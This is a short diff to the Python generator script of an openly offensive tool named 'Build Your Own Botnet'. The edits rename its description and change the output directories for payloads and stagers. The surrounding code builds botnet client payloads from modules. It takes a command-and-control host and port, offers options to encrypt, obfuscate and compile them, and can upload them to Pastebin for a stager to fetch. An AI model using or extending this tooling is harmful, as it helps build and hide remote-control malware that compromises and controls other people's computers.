@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-"""Client Generator (Build Your Own Botnet)
+"""Generator (Build Your Own Botnet)
 
 Generate clients with the following features:
 
@@ -100,7 +100,7 @@ __banner = """
 # main
 def main():
     """ 
-    Parse command-line arguments and run the client generator
+    Parse command-line arguments and run the generator
 
     usage: generators.py [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
                          [--encrypt] [--obfuscate] [--compress] [--compile]
@@ -129,7 +129,7 @@ def main():
 
     parser = argparse.ArgumentParser(prog='generator.py', 
                                     version='0.1.5',
-                                    description="Client Generator (Build Your Own Botnet)")
+                                    description="Generator (Build Your Own Botnet)")
     parser.add_argument('host',
                         action='store',
                         type=str,
@@ -267,9 +267,9 @@ def _payload(options, **kwargs):
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
     payload = '\n'.join(list(kwargs['imports']) + [open(module,'r').read().partition('# main')[2] for module in kwargs['modules']]) + generators.snippet('main', 'Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'
-    if not os.path.exists('modules/payloads'):
+    if not os.path.exists('payloads'):
         try:
-            os.mkdir('modules/payloads')
+            os.mkdir('payloads')
         except OSError:
             __logger__.debug("Permission denied: unabled to make directory './modules/payloads/'")
 
@@ -331,9 +331,9 @@ def _stager(options, **kwargs):
     assert 'key' in kwargs, "missing keyword argument 'key'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
     stager = open('core/stager.py', 'r').read() + generators.snippet('main', 'run', url=kwargs['url'], key=kwargs['key'])
-    if not os.path.exists('modules/stagers'):
+    if not os.path.exists('stagers'):
         try:
-            os.mkdir('modules/stagers')
+            os.mkdir('stagers')
         except OSError:
             __logger__.debug("Permission denied: unable to make directory './modules/stagers/'")
 
